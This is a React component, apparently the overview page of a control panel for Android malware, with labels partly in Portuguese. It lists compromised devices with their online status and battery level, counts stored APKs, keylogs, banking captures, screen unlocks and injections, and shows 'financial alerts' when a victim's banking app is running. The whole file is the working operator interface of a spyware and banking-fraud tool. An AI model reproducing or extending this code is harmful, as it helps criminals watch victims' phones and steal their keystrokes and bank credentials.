import { useEffect, useState } from 'react';
import useStore from '../../store/index.js';

export default function Overview() {
  const stats     = useStore(s => s.stats);
  const devices   = useStore(s => s.devices);
  const onlineIds = useStore(s => s.onlineIds);
  const connected = useStore(s => s.connected);
  const latency   = useStore(s => s.latency);
  const setTab    = useStore(s => s.setTab);
  const selectDevice = useStore(s => s.selectDevice);
  const [financial, setFinancial] = useState([]);

  const onlineCount  = devices.filter(d => onlineIds.has(d.device_id)).length;
  const totalDevices = devices.length;
  const latClass     = latency < 300 ? '#00c864' : latency < 700 ? '#d4950a' : '#e03060';

  useEffect(() => {
    fetch('/api/financial').then(r => r.json()).then(setFinancial).catch(() => {});
  }, []);

  function goToDevice(id) {
    selectDevice(id);
    setTab('android');
  }

  return (
    <div className="fade-up">
      {/* Robot assistant banner */}
      <div className="card card-sm mb12" style={{ borderColor: 'rgba(59,122,240,.4)', background: 'rgba(20,25,40,.92)' }}>
        <div className="row">
          <div style={{ fontSize: 32 }}>🤖</div>
          <div className="flex1">
            <div className="bold" style={{ color: '#3b7af0' }}>ROBÔ ASSISTENTE</div>
            <div className="txt-xs txt-dim">Comandar Aparelho em Tempo Real</div>
          </div>
          <span className="pill pill-blue">CHAT IA</span>
        </div>
      </div>

      {/* Server status */}
      <div className="section">
        <div className="section-title"><span className="section-icon">📡</span>Server</div>
        <div className="card">
          <div className="card-row">
            <div className="card-icon">📡</div>
            <div className="card-body">
              <div className="card-label">Servidor</div>
              <div className="row gap6 mt4">
                <span style={{ fontSize: 28, fontWeight: 800, color: latClass }}>
                  {latency || '—'}
                </span>
                <span className="txt-dim txt-sm">ms</span>
              </div>
            </div>
            <div className="card-action">
              <span className={`pill ${connected ? 'pill-green' : 'pill-red'}`}>
                {connected ? 'ONLINE' : 'OFFLINE'}
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Devices */}
      <div className="section">
        <div className="section-title"><span className="section-icon">📱</span>Devices</div>
        <div className="card" style={{ cursor: 'pointer' }} onClick={() => setTab('android')}>
          <div className="card-row">
            <div className="card-icon">📱</div>
            <div className="card-body">
              <div className="card-label">Devices</div>
              <div className="row gap6 mt4">
                <span className="card-value">{totalDevices}</span>
                <span className="txt-dim txt-sm">registered</span>
              </div>
              <div className="progress mt4">
                <div className="progress-fill" style={{ width: totalDevices ? '100%' : '0%' }} />
              </div>
            </div>
            <div className="card-action">
              <span className="pill pill-green">
                <span className="dot dot-green" style={{ width: 6, height: 6 }} />
                {onlineCount} ON
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Stored APKs */}
      <div className="section">
        <div className="section-title"><span className="section-icon">📦</span>APKs</div>
        <div className="card">
          <div className="card-row">
            <div className="card-icon">📦</div>
            <div className="card-body">
              <div className="card-label">Stored Apps</div>
              <div className="row gap6 mt4">
                <span className="card-value">{stats.stored_apks || 0}</span>
                <span className="txt-dim txt-sm">APKs</span>
              </div>
            </div>
            <div className="card-action">
              <button className="btn btn-gold btn-sm">
                Meus Apps ⚡
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Stats row */}
      <div className="grid g2 mb12">
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#f0b030' }}>{stats.total_keylogs || 0}</div>
          <div className="txt-xs txt-dim mt4">KEYLOGS</div>
        </div>
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#e03060' }}>{stats.total_banking || 0}</div>
          <div className="txt-xs txt-dim mt4">BANKING</div>
        </div>
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#9855e8' }}>{stats.total_unlocks || 0}</div>
          <div className="txt-xs txt-dim mt4">UNLOCKS</div>
        </div>
        <div className="card card-sm" style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 22, fontWeight: 800, color: '#00c864' }}>{stats.total_injects || 0}</div>
          <div className="txt-xs txt-dim mt4">INJECTS</div>
        </div>
      </div>

      {/* Financial alerts */}
      <div className="section">
        <div className="section-title"><span className="section-icon">💰</span>Alertas Financeiros</div>
        <div className="card">
          <div className="row-sb">
            <div>
              <div className="dot dot-gold" style={{ display: 'inline-block', marginRight: 6 }} />
              <span className="txt-sm bold" style={{ color: '#d4950a' }}>Alertas Financeiros:</span>
            </div>
            <span className="pill pill-gold">SISTEMA ATIVO</span>
          </div>
          {financial.length === 0 ? (
            <div className="txt-dim txt-sm mt8">Nenhum aplicativo bancário em execução no momento</div>
          ) : (
            <div className="mt8" style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {financial.slice(0, 5).map((f, i) => (
                <div key={i} className="row-sb" style={{ padding: '6px 0', borderBottom: '1px solid rgba(212,149,10,.1)' }}>
                  <span className="txt-sm" style={{ color: '#e03060' }}>{f.bank}</span>
                  <span className="txt-xs txt-dim">{f.alert}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Device panel overview */}
      <div className="section">
        <div className="section-title"><span className="section-icon">📱</span>Painel de Dispositivos</div>
        <div className="card">
          <div className="row gap6 mb12">
            <span className="bold txt-dim txt-sm">📱</span>
            <span className="txt-sm bold">PAINEL DE DISPOSITIVO...</span>
          </div>
          <div className="row gap6">
            <span className={`pill ${onlineCount > 0 ? 'pill-green' : 'pill-dim'}`}>
              <span className="dot dot-green" style={{ width: 6, height: 6 }} />
              {onlineCount} ONLINE
            </span>
            <span className="pill pill-dim">
              <span className="dot dot-red" style={{ width: 6, height: 6 }} />
              {totalDevices - onlineCount} OFFLINE
            </span>
          </div>
          {devices.length > 0 && (
            <div className="mt12" style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              {devices.slice(0, 3).map(d => (
                <div
                  key={d.device_id}
                  className="row-sb"
                  style={{ padding: '8px 10px', background: 'rgba(212,149,10,.06)', borderRadius: 8, cursor: 'pointer' }}
                  onClick={() => goToDevice(d.device_id)}
                >
                  <div className="row gap6">
                    <span className={`dot ${onlineIds.has(d.device_id) ? 'dot-green' : 'dot-red'}`} />
                    <span className="txt-sm bold">{d.model || d.device_id}</span>
                  </div>
                  <span className="txt-xs txt-dim">{d.battery_level || 0}%</span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
